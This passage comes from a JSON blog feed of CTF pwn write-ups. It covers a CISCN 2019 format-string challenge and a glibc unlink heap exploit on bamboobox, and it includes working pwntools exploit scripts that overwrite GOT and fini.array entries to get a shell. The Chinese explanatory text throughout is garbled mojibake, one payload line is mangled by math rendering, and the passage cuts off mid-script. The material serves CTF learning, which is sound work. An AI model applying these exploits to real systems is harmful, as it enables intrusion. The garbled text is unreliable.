remote('node5.anna.nssctf.cn',28929)\nr.sendline(&quot;3&quot;) \nr.sendline(&quot;0&quot;) \n\nr.sendline(&quot;3&quot;)\nr.sendline(&quot;0&quot;)  \n\nr.interactive()\n</code></pre>\n<p><strong>ç»“æœå¦‚ä¸‹ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181643187.png\" alt=\"20230922181643187\"></p>\n<ul>\n<li>two</li>\n</ul>\n<h2 id=\"ciscn-2019è¥¿å—pwn1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2019è¥¿å—pwn1\">#</a> [CISCN 2019 è¥¿å—] PWN1</h2>\n<blockquote>\n<p>å½“ <code>RELRO</code>  ä¿æŠ¤ä¸º <code>NO RELRO</code>  çš„æ—¶å€™ï¼Œ <code>init.arrayã€fini.arrayã€got.plt</code>  å‡å¯è¯»å¯å†™ï¼›ä¸º <code>PARTIAL RELRO</code>  çš„æ—¶å€™ï¼Œ <code>ini.arrayã€fini.array</code>  å¯è¯»ä¸å¯å†™ï¼Œ <code>got.plt</code>  å¯è¯»å¯å†™ï¼›ä¸º <code>FULL RELRO</code>  æ—¶ï¼Œ <code>init.arrayã€fini.arrayã€got.plt</code>  å‡å¯è¯»ä¸å¯å†™ã€‚</p>\n</blockquote>\n<blockquote>\n<p>ç¨‹åºåœ¨åŠ è½½çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨ <code>init.array</code>  æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œåœ¨ç»“æŸçš„æ—¶å€™ï¼Œä¾æ¬¡è°ƒç”¨ <code>fini.array</code>  ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</p>\n</blockquote>\n<blockquote>\n<p>å½“ç¨‹åºå‡ºç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯éœ€è¦å†™ä¸¤æ¬¡æ‰èƒ½å®Œæˆæ”»å‡»ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è€ƒè™‘æ”¹å†™ <code>fini.array</code>  ä¸­çš„å‡½æ•°æŒ‡é’ˆä¸º <code>main</code>  å‡½æ•°åœ°å€ï¼Œå¯ä»¥å†æ‰§è¡Œä¸€æ¬¡ <code>main</code>  å‡½æ•°ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º <code>1</code> ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½å†™ä¸€ä¸ªåœ°å€ã€‚</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922182614061.png\" alt=\"20230922182614061\"></p>\n<p>32 ä½ç¨‹åºä¿®æ”¹ got è¡¨ã€‚</p>\n<p><strong>æ‰§è¡Œç¨‹åºå‚çœ‹åç§»ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922183714065.png\" alt=\"20230922183714065\"></p>\n<p><strong>çœ‹ä¸€ä¸‹ IDA:</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184018564.png\" alt=\"20230922184018564\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184142420.png\" alt=\"20230922184142420\"></p>\n<p><strong>åˆ©ç”¨æ€è·¯ï¼š</strong></p>\n<p>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»ä¿®æ”¹ printf_gotï¼Œä¿®æ”¹ä¸º systemã€‚ä½†æ˜¯ç¨‹åºåªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥ä¿®æ”¹å®Œåï¼Œç¨‹åºä¼šé€€å‡ºã€‚</p>\n<p>ä½†æ˜¯å¦‚æœå¦‚ä¸‹å›¾æ‰€ç¤º</p>\n<p><img data-src=\"/img/pwnlianxi/20230922184525768.png\" alt=\"20230922184525768\"></p>\n<p>æˆ‘ä»¬å°±å¯ä»¥å»ä¿®æ”¹ <code>fini.array</code> , å°†å…¶å‚æ•° 1ï¼Œç»™è¦†å†™æˆ mainï¼Œé‚£ä¹ˆç¨‹åºåœ¨é€€å‡ºåå°±ä¼šå†æ¬¡æ‰§è¡Œ main å‡½æ•°ã€‚</p>\n<p><strong>payloadï¼š</strong></p>\n<blockquote>\n<p>payload = b&quot;%2052c%13<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">hn%31692c%14</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">n</span></span></span></span>hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)</p>\n</blockquote>\n<p>é€šè¿‡ gdb å»çœ‹ä¸€çœ¼ payload è¿›å…¥ç¨‹åºçš„æƒ…å†µï¼š</p>\n<p><img data-src=\"/img/pwnlianxi/20230922185014496.png\" alt=\"20230922185014496\"></p>\n<p>å½“è¯»å…¥ pyload æ—¶çš„æƒ…å†µ</p>\n<p>è¿™æ—¶ç¨‹åºè¯»å…¥ payloadã€‚ç°åœ¨ got è¡¨é¡¹æŒ‡å‘çš„è¿˜æ˜¯ printf_pltã€‚</p>\n<p><img data-src=\"/img/pwnlianxi/20230922191625014.png\" alt=\"20230922191625014\"></p>\n<p>å½“æ‰§è¡Œåˆ° printf å‡½æ•°æ—¶ï¼Œprintf_got ä¿®æ”¹ä¸º system  fini_array çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¿®æ”¹ä¸º main</p>\n<p>å½“æˆ‘ä»¬ç¨‹åºç»“æŸæ—¶ï¼Œå°±ä¼šå†æ¬¡è·³è½¬åˆ° main å‡½æ•°å…¥å£ï¼Œåœ¨è¯»å…¥ /bin/shï¼Œæ¥ç€ä¼šåœ¨è°ƒç”¨ printf å‡½æ•°ï¼Œä¼šæ‰§è¡Œ system (/bin/sh)ï¼Œä»è€Œè·å– shell</p>\n<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>\n<pre><code>from pwn import *\nr = remote('node5.anna.nssctf.cn',28467)\n# r = gdb.debug(&quot;./XNPWN1&quot;)\n# å¾€fini.array[0]å†™main@text, printf@gotå†™system@plt\npayload = b&quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)\nr.recvline()\n\nr.sendline(payload)\n\nr.sendline(&quot;/bin/sh&quot;)\nr.interactive()\n</code></pre>\n",
            "tags": [
                "æ ¼å¼åŒ–å­—ç¬¦ä¸²",
                "gotè¡¨"
            ]
        },
        {
            "id": "http://example.com/2023/08/11/unlink/",
            "url": "http://example.com/2023/08/11/unlink/",
            "title": "unlink",
            "date_published": "2023-08-11T05:56:52.000Z",
            "content_html": "<h1 id=\"pwn_unlinkäº†è§£å­¦ä¹ \"><a class=\"markdownIt-Anchor\" href=\"#pwn_unlinkäº†è§£å­¦ä¹ \">#</a> PWN_unlink äº†è§£å­¦ä¹ </h1>\n<h2 id=\"åŸç†\"><a class=\"markdownIt-Anchor\" href=\"#åŸç†\">#</a> åŸç†ï¼š</h2>\n<p>æˆ‘ä»¬åœ¨åˆ©ç”¨ unlink æ‰€é€ æˆçš„æ¼æ´æ—¶ï¼Œå…¶å®å°±æ˜¯å¯¹ chunk è¿›è¡Œå†…å­˜å¸ƒå±€ï¼Œç„¶åå€ŸåŠ© unlink æ“ä½œæ¥è¾¾æˆä¿®æ”¹æŒ‡é’ˆçš„æ•ˆæœã€‚</p>\n<p><em>æ³¨æ„è¿™é‡Œçš„æ˜¯ä¿®æ”¹æŒ‡é’ˆ</em></p>\n<p>ç®€å•çš„ä»‹ç»ä¸‹ unlinkï¼Œå…¶å® ctfwiki æœ‰ä»‹ç»ï¼Œè¿™é‡Œç®€å•ä»‹ç»ä¸‹ï¼š</p>\n<pre><code>1. é¦–å…ˆæ‰¾åˆ°è¦è¿›è¡Œunlinkçš„chunk(è¿™é‡Œè®°ä¸ºP)çš„å‰åå †å—ï¼Œ\n   FD = P-&gt;fd, BK = P-&gt;bkã€‚\n\t\n2. è¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼Œglibc2.23çš„æ½¦è‰åˆ¤æ–­æ¡ä»¶å¦‚ä¸‹\n   FD-&gt;bk == P, BK-&gt;fd == Pã€‚\n   \n3. ç„¶åæ‰§è¡ŒFD-&gt;bk=BK, BK-&gt;fd=FDã€‚\n\n4. å½“æŸä¸ªnon-fastå¤§å°çš„chunkè¢«é‡Šæ”¾æ—¶ï¼Œå°±ä¼šæ ¹æ®PREV_INUSEä½æ£€æŸ¥å…¶å‰åå †å—æ˜¯å¦å¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œå¦‚æœæ˜¯å°±ä¼šå°†å‰é¢æˆ–åé¢çš„å †å—å–å‡ºå¹¶ä¸å½“å‰å †å—åˆå¹¶ã€‚å–å‡ºå‰é¢æˆ–åé¢çš„å †å—Pçš„è¿‡ç¨‹å°±æ˜¯unlink\n</code></pre>\n<p>è¿™é‡Œå°±æ˜¯æˆ‘ä»¬éœ€è¦æ„é€  fake_chunk å»ç»•è¿‡æ£€æŸ¥ï¼Œåˆ©ç”¨ unlink æ¼æ´ï¼Œå»è¾¾åˆ°æˆ‘ä»¬æƒ³è¦è¾¾æˆçš„æ•ˆæœã€‚</p>\n<ul>\n<li>åˆ©ç”¨ pwn unlink æ¼æ´å¯ä»¥å®ç°ä»¥ä¸‹æ”»å‡»ï¼š</li>\n</ul>\n<ol>\n<li><strong>æ³„éœ²å†…å­˜</strong>ï¼šé€šè¿‡ unlink æ¼æ´ï¼Œå¯ä»¥å°†ä¸¤ä¸ªç›¸é‚»çš„å †å—åˆå¹¶ï¼Œå¯¼è‡´ä¸€ä¸ªå·²ç»é‡Šæ”¾çš„å †å—ä¸­çš„æŒ‡é’ˆè¢«ç¯¡æ”¹ã€‚é€šè¿‡ä¿®æ”¹æŒ‡é’ˆçš„å€¼ï¼Œå¯ä»¥æ³„éœ²å †ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å‡½æ•°æŒ‡é’ˆã€å †å—å¤´éƒ¨æ•°æ®ç­‰ã€‚</li>\n<li><strong>ä»»æ„å†…å­˜å†™</strong>ï¼šé€šè¿‡ unlink æ¼æ´ï¼Œå¯ä»¥ä¿®æ”¹å·²ç»é‡Šæ”¾çš„å †å—çš„å‰åæŒ‡é’ˆï¼Œä»è€Œå®ç°ä»»æ„å†…å­˜å†™ã€‚è¿™å¯ä»¥ç”¨æ¥ä¿®æ”¹å…³é”®æ•°æ®ç»“æ„ï¼Œå¦‚å †å—å¤´éƒ¨ã€å…¨å±€å˜é‡ç­‰ï¼Œè¿›è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</li>\n<li><strong>æ‰§è¡Œä»»æ„ä»£ç </strong>ï¼šé€šè¿‡æ³„éœ²å‡½æ•°æŒ‡é’ˆæˆ–ä¿®æ”¹è¿”å›åœ°å€ç­‰æ–¹å¼ï¼Œå¯ä»¥ç¯¡æ”¹ç¨‹åºçš„æ§åˆ¶æµï¼Œä»è€Œå®ç°ä»£ç æ‰§è¡Œã€‚è¿™å¯ä»¥ç”¨æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€è·å–ç³»ç»Ÿæƒé™ç­‰ã€‚</li>\n</ol>\n<blockquote>\n<p><img data-src=\"/img/unlinkpic/unlink_smallbin_intro.png\" alt=\"img\"></p>\n</blockquote>\n<blockquote>\n<p>åˆ©ç”¨æ€è·¯ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI18y\">Â¶</span></p>\n<p>æ¡ä»¶ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI18z\">Â¶</span></p>\n<ol>\n<li>UAF ï¼Œå¯ä¿®æ”¹ free çŠ¶æ€ä¸‹ smallbin æˆ–æ˜¯ unsorted bin çš„ fd å’Œ bk æŒ‡é’ˆ</li>\n<li>å·²çŸ¥ä½ç½®å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¯è¿›è¡Œ UAF çš„ chunk</li>\n</ol>\n<p>æ•ˆæœ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI180\">Â¶</span></p>\n<p>ä½¿å¾—å·²æŒ‡å‘ UAF chunk çš„æŒ‡é’ˆ ptr å˜ä¸º ptr - 0x18</p>\n<p>æ€è·¯ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI181\">Â¶</span></p>\n<p>è®¾æŒ‡å‘å¯ UAF chunk çš„æŒ‡é’ˆçš„åœ°å€ä¸º ptr</p>\n<ol>\n<li>ä¿®æ”¹ fd ä¸º ptr - 0x18</li>\n<li>ä¿®æ”¹ bk ä¸º ptr - 0x10</li>\n<li>è§¦å‘ unlink</li>\n</ol>\n<p>ptr å¤„çš„æŒ‡é’ˆä¼šå˜ä¸º ptr - 0x18ã€‚</p>\n<p>å…‰è®²åŸç†ï¼Œå¾ˆæ¯ç‡¥ä¹å‘³ã€‚ä¸Šä¸ªé¢˜ç›®ï¼Œææå…´è¶£ã€‚</p>\n</blockquote>\n<h3 id=\"é¢˜ç›®æ¥æº\"><a class=\"markdownIt-Anchor\" href=\"#é¢˜ç›®æ¥æº\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2hpdGNvbnRyYWluaW5nX3VubGluaw==\">é¢˜ç›®æ¥æºï¼š</span></h3>\n<h6 id=\"ä¾‹è¡Œæ£€æŸ¥\"><a class=\"markdownIt-Anchor\" href=\"#ä¾‹è¡Œæ£€æŸ¥\">#</a> ä¾‹è¡Œæ£€æŸ¥ï¼š</h6>\n<p><img data-src=\"/img/unlinkpic/image-20230811115628259.png\" alt=\"image-20230811115628259\"></p>\n<h6 id=\"æ‰§è¡Œç¨‹åº\"><a class=\"markdownIt-Anchor\" href=\"#æ‰§è¡Œç¨‹åº\">#</a> æ‰§è¡Œç¨‹åºï¼š</h6>\n<p><img data-src=\"/img/unlinkpic/image-20230811115714589.png\" alt=\"image-20230811115714589\"></p>\n<blockquote>\n<p>ç»™äº†ä¸ªèœå•ï¼Œä¸€å…± 5 ä¸ª nodeã€‚è¿™é‡Œå°±ä¸ä¸€ä¸€æ‰§è¡Œäº†ã€‚</p>\n</blockquote>\n<h6 id=\"idaçœ‹æºä»£ç \"><a class=\"markdownIt-Anchor\" href=\"#idaçœ‹æºä»£ç \">#</a> IDA çœ‹æºä»£ç ï¼š</h6>\n<ul>\n<li>main:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811115907614.png\" alt=\"image-20230811115907614\"></p>\n<blockquote>\n<p>å¯ä»¥çœ‹åˆ°å¾ˆå¤šå‡½æ•°ã€‚è¿™é‡Œç®€å•è®²ä¸€ä¸‹å§ã€‚ç¨‹åºé¦–å…ˆç”³è¯·äº† 0x10 å­—èŠ‚å¤§å°çš„å †ç©ºé—´ã€‚å¹¶å°†è¿”å›çš„æŒ‡é’ˆèµ‹äºˆ v4 å˜é‡ã€‚å°† v4 [0] çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘ hello_message å†…å®¹ï¼Œv4 [1] çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘ goodbye_message çš„å†…å®¹ã€‚ç„¶åå¼€å¤´æ‰“å° v4 [0] æŒ‡å‘çš„å†…å®¹ã€‚æ¥ç€è¿›è¡Œå¾ªç¯ï¼Œæ¯å¾ªç¯ä¸€æ¬¡éƒ½ä¼šè°ƒç”¨ menu å‡½æ•°ï¼Œå¹¶ä¸”è¾“å…¥ä¸€ä¸ªä¸é•¿äº 8 å­—èŠ‚çš„æ•°å­—ï¼Œç„¶åå°†è¾“å…¥çš„æ•°å­—è½¬æ¢æˆæ•´æ•°è¿›è¡Œ switch åŒ¹é…ã€‚</p>\n</blockquote>\n<ul>\n<li>add_item:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811121510474.png\" alt=\"image-20230811121510474\"></p>\n<blockquote>\n<p>add è¦æ±‚è¾“å…¥å¤§å°å’Œå†…å®¹ã€‚åœ¨è¿™é‡Œå¯ä»¥å¾ˆæ˜æ˜¾çš„å‘ç°ä¸€å— bss æ®µåœ°å€ã€‚å› ä¸º bss æ®µå¯ä»¥ä»»æ„è¯»å†™ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ unlink æ¼æ´åœ¨ bss æ®µå†™å…¥ got åœ°å€ï¼Œä»è€Œå¯ä»¥æ³„éœ² libc åœ°å€</p>\n</blockquote>\n<ul>\n<li>remove_item:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811124741272.png\" alt=\"image-20230811124741272\"></p>\n<blockquote>\n<p>ä¸å­˜åœ¨ uaf æ¼æ´ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ free ä¸€ä¸ªé fastbins å¤§å°çš„ chunkï¼Œå»è§¦å‘ unlink æ¼æ´ã€‚</p>\n</blockquote>\n<ul>\n<li>\n<p>change_item:</p>\n<p><img data-src=\"/img/unlinkpic/image-20230811124946810.png\" alt=\"image-20230811124946810\"></p>\n</li>\n</ul>\n<blockquote>\n<p>æ³¨é‡Šå³ä½¿é‡ç‚¹ï¼</p>\n</blockquote>\n<ul>\n<li>\n<p>show_item:</p>\n<p><img data-src=\"/img/unlinkpic/image-20230811125058481.png\" alt=\"image-20230811125058481\"></p>\n</li>\n</ul>\n<blockquote>\n<p>åˆ©ç”¨è¿™é‡Œçš„è¾“å‡ºï¼Œå¯ä»¥å»æ‰“å°å¤„ libc åœ°å€</p>\n</blockquote>\n<h6 id=\"expæ„é€ è¿‡ç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#expæ„é€ è¿‡ç¨‹\">#</a> exp æ„é€ è¿‡ç¨‹ï¼š</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n </span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># To stop merging chunk</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>é¦–å…ˆ make chunkã€‚</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ptr<span class=\"token operator\">=</span><span class=\"token number\">0x6020c8</span><span class=\"token comment\">#æŒ‡å‘ itemlist å†…å®¹</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fd<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>bk<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>fake_chunk<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>bk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token comment\">#å †æº¢å‡ºï¼Œæ”¹å†™ chunk1 çš„å¤´ï¼Œä¸ºåç»­ unlink è§¦å‘ã€‚</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#è§¦å‘ unlink, ä½¿ chunk0 æŒ‡å‘ itemlist å†…å®¹</span></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯æ³„éœ² libcï¼Œç„¶åå»è¦†ç›– got åœ°å€ã€‚æ‰§è¡Œ shell å‡½æ•°ã€‚</p>\n<h6 id=\"æœ€ç»ˆçš„exp\"><a class=\"markdownIt-Anchor\" href=\"#æœ€ç»ˆçš„exp\">#</a> æœ€ç»ˆçš„ expï¼š</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># r = remote('node4.buuoj.cn',25461)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./bamboobox')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./bamboobox'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./bamboobox'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token 